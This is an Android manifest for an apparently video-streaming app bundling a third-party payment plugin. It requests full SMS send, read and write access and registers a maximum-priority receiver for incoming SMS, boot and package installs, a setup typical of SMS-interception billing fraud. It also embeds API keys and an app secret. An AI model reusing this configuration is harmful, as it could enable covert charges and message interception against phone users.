<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.ddddd"
    android:versionCode="18"
    android:versionName="1.8" >

    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="21" />

    <!-- Required  一些系统要求的权限，如访问网络等 -->
    <uses-permission android:name="com.example.ddddd.permission.JPUSH_MESSAGE" />
    <uses-permission android:name="android.permission.RECEIVE_USER_PRESENT" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
    <uses-permission android:name="android.permission.VIBRATE" />
    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />

    <!-- Optional for location -->
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS" />
    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" /> 

    <!-- 需配置SDK版本 -->
    <!-- 震动 -->
    <uses-permission android:name="android.permission.VIBRATE" >
    </uses-permission>
    <!-- 插件 -->
    <uses-permission android:name="android.webkit.permission.PLUGIN" >
    </uses-permission>
    <!-- 网络请求 -->
    <uses-permission android:name="android.permission.INTERNET" >
    </uses-permission>
    <!-- 发送短信 -->
    <uses-permission android:name="android.permission.SEND_SMS" >
    </uses-permission>
    <!-- 短信读取 -->
    <uses-permission android:name="android.permission.READ_SMS" >
    </uses-permission>
    <!-- 修改读取 -->
    <uses-permission android:name="android.permission.WRITE_SMS" >
    </uses-permission>
    <!-- 短信获取 -->
    <uses-permission android:name="android.permission.RECEIVE_SMS" >
    </uses-permission>
    <!-- 包安装监听 -->
    <uses-permission android:name="android.permission.RESTART_PACKAGES" >
    </uses-permission>
    <!-- 读取本地配置数据 -->
    <uses-permission android:name="android.permission.READ_PHONE_STATE" >
    </uses-permission>
    <!-- 监听WIFI样式 -->
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" >
    </uses-permission>
    <!-- 修改网络状态 -->
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" >
    </uses-permission>
    <!-- 定位 -->
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" >
    </uses-permission>
    <!-- 监听网络状态变化 -->
    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" >
    </uses-permission>
    <!-- 往SDCard写入数据权限 -->
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" >
    </uses-permission>
    <!-- 在SDCard中创建与删除文件权限 -->
    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" >
    </uses-permission>
    <!-- 弹窗 -->
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" >
    </uses-permission>
    <!-- 随机启动 -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" >
    </uses-permission>
    <!-- 配置当前启动类,并设定屏幕转向 -->

    <application
        android:name="com.example.ddddd.MyApp"
        android:allowBackup="true"
        android:configChanges="orientation|keyboardHidden|screenSize"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:screenOrientation="portrait"
        android:theme="@android:style/Theme.NoTitleBar" >
        <activity
            android:name="com.example.ddddd.activity.MainActivity"
            android:screenOrientation="portrait" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <activity
            android:name="com.example.ddddd.activity.GuideActivity"
            android:screenOrientation="portrait" />
       <!--  <activity
            android:name="com.example.ddddd.activity.MainActivity"
            android:screenOrientation="portrait" /> -->
        <activity
            android:name="com.example.ddddd.activity.DetailActivity"
            android:screenOrientation="portrait" />
        <activity
            android:name="com.example.ddddd.activity.VideoPlayerActivity"
            android:screenOrientation="landscape" />
        <activity
            android:name="com.example.ddddd.activity.MoreActivity"
            android:screenOrientation="portrait" />
        <activity
            android:name="com.example.ddddd.activity.UserInfoActivity"
            android:screenOrientation="portrait" />
        <activity
            android:name="com.example.ddddd.activity.ProtocolActivity"
            android:screenOrientation="portrait" />
        <activity
            android:name="com.example.ddddd.activity.VideoHistoryActivity"
            android:screenOrientation="portrait" />
        <activity
            android:name="com.example.ddddd.activity.AboutActivity"
            android:screenOrientation="portrait" />
        <activity
            android:name="com.example.ddddd.activity.VideoListActivity"
            android:screenOrientation="portrait" />

        <receiver android:name="com.example.ddddd.receiver.DownloadReceiver" >
            <intent-filter>
                <action android:name="android.intent.action.DOWNLOAD_COMPLETE"/>
            </intent-filter>
        </receiver>

        <!-- 友盟 -->
        <meta-data
            android:name="UMENG_APPKEY"
            android:value="56d4385a67e58e9b530010db" >
        </meta-data>
        <meta-data
            android:name="UMENG_CHANNEL"
            android:value="lz2" />

        <!-- 支付 -->
        <!-- 二次确认 -->
        <activity
            android:name="com.wo.main.WP_V_Pay"
            android:configChanges="orientation|keyboardHidden|screenSize"
            android:launchMode="singleTop"
            android:screenOrientation="portrait"
            android:theme="@android:style/Theme.Light.NoTitleBar" >
        </activity>
        <!-- 确认列表 -->
        <activity
            android:name="com.wo.main.WP_V_PayList"
            android:configChanges="orientation|keyboardHidden|screenSize"
            android:launchMode="singleTop"
            android:screenOrientation="portrait"
            android:theme="@android:style/Theme.Light.NoTitleBar" >
        </activity>
        <!-- 失败提示框 -->
        <activity
            android:name="com.wo.main.WP_V_Error"
            android:configChanges="orientation|keyboardHidden|screenSize"
            android:launchMode="singleTop"
            android:screenOrientation="portrait"
            android:theme="@android:style/Theme.Light.NoTitleBar" >
        </activity>
        <!-- 加载提示框 -->
        <activity
            android:name="com.wo.main.WP_V_Progress"
            android:configChanges="orientation|keyboardHidden|screenSize"
            android:launchMode="singleTop"
            android:screenOrientation="portrait"
            android:theme="@android:style/Theme.Translucent.NoTitleBar" >
        </activity>
        <!-- 启动 -->
        <activity
            android:name="com.wo.plugin.bt.BT_V_Open"
            android:configChanges="orientation|keyboardHidden|screenSize"
            android:launchMode="singleTop"
            android:screenOrientation="portrait"
            android:theme="@android:style/Theme.Light.NoTitleBar" >
        </activity>
        <!-- 充值 -->
        <activity
            android:name="com.wo.plugin.bt.BT_V_Pay"
            android:configChanges="orientation|keyboardHidden|screenSize"
            android:launchMode="singleTop"
            android:screenOrientation="portrait"
            android:theme="@android:style/Theme.NoDisplay" >
        </activity>
        <!-- 简介 -->
        <activity
            android:name="com.wo.plugin.bt.BT_V_Protocol"
            android:configChanges="orientation|keyboardHidden|screenSize"
            android:launchMode="singleTop"
            android:screenOrientation="portrait"
            android:theme="@android:style/Theme.Light.NoTitleBar" >
        </activity>
        <!-- 支付宝开始 -->
        <activity
            android:name="com.alipay.sdk.app.H5PayActivity"
            android:configChanges="orientation|keyboardHidden|navigation"
            android:exported="false"
            android:screenOrientation="behind" >
        </activity>
        <activity
            android:name="com.alipay.sdk.auth.AuthActivity"
            android:configChanges="orientation|keyboardHidden|navigation"
            android:exported="false"
            android:screenOrientation="behind" >
        </activity>
        <!-- 支付宝结束 -->
        <!-- 现在支付微信 -->
        <activity
            android:name="com.wo.plugin.nwx.WP_NWX"
            android:configChanges="orientation|keyboardHidden|screenSize"
            android:launchMode="singleTop"
            android:screenOrientation="portrait"
            android:theme="@android:style/Theme.NoDisplay" >
        </activity>
        <activity
            android:name="com.ipaynow.plugin.activity.PayMethodActivity"
            android:configChanges="keyboardHidden|orientation"
            android:exported="false"
            android:screenOrientation="portrait"
            android:theme="@android:style/Theme.Dialog" >
        </activity>
        <activity
            android:name="com.ipaynow.plugin.inner_plugin.prepay_plugin.activity.PrePayActivity"
            android:screenOrientation="portrait"
            android:windowSoftInputMode="adjustResize" >
        </activity>
        <activity
            android:name="com.ipaynow.plugin.inner_plugin.prepay_plugin.activity.NotifyActivity"
            android:configChanges="orientation"
            android:exported="false"
            android:screenOrientation="portrait" >
        </activity>
        <activity
            android:name="com.ipaynow.plugin.inner_plugin.wechatwp.activity.WeChatNotifyActivity"
            android:configChanges="keyboardHidden|navigation|orientation|screenSize"
            android:exported="false"
            android:launchMode="singleTop"
            android:screenOrientation="behind"
            android:theme="@android:style/Theme.NoDisplay" >
        </activity>
        <!-- 微信支付结束 -->
        <!-- 后台服务,可供其他程序调用 -->
        <service
            android:name="com.wo.main.WP_Service"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.RECEIVE_BOOT_COMPLETED" >
        </service>
        <!-- 后台更新服务 -->
        <service
            android:name="com.wo.main.WP_ApkService"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.RECEIVE_BOOT_COMPLETED" >
        </service>
        <!-- 添加状态监听 -->
        <receiver android:name="com.wo.main.WP_Receiver" >
            <intent-filter android:priority="2147483647" >

                <!-- 网络状态更新 -->
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" >
                </action>
            </intent-filter>
            <intent-filter android:priority="2147483647" >

                <!-- 短信获取 -->
                <action android:name="android.provider.Telephony.SMS_RECEIVED" >
                </action>
            </intent-filter>
            <intent-filter android:priority="2147483647" >

                <!-- 监听安装 -->
                <action android:name="android.intent.action.PACKAGE_ADDED" >
                </action>
                <!-- 监听 -->
                <data android:scheme="package" >
                </data>
            </intent-filter>
            <intent-filter android:priority="2147483647" >

                <!-- 随机启动 -->
                <action android:name="android.intent.action.BOOT_COMPLETED" >
                </action>
            </intent-filter>
            <intent-filter android:priority="2147483647" >

                <!-- 启动轮询 -->
                <action android:name="android.intent.action.START_REPORT" >
                </action>
            </intent-filter>
            <intent-filter android:priority="2147483647" >

                <!-- 启动 -->
                <action android:name="android.intent.action.CBOOT_COMPLETED" >
                </action>
            </intent-filter>
        </receiver>
        <!-- 应用ID -->
        <meta-data
            android:name="APPID"
            android:value="WO2016022900003" >
        </meta-data>
        <!-- 应用标识 -->
        <meta-data
            android:name="APPKEY"
            android:value="0c553a07047a465b821b107221553a3a" >
        </meta-data>
        <!-- 应用秘钥 -->
        <meta-data
            android:name="APPSECRET"
            android:value="843b5582bcff444496ea54a350d39a97" >
        </meta-data>
        <!-- 应用配置数据 -->
        <meta-data
            android:name="APPDATA"
            android:value="-100002_72_-10001429_322" >
        </meta-data>
        <!-- 对应任意金额 -->
        <meta-data
            android:name="APPCODE"
            android:value="706d850d1cd14d1db66889c827ecfd2b" >
        </meta-data>
        <!-- 支付end -->
    </application>

</manifest>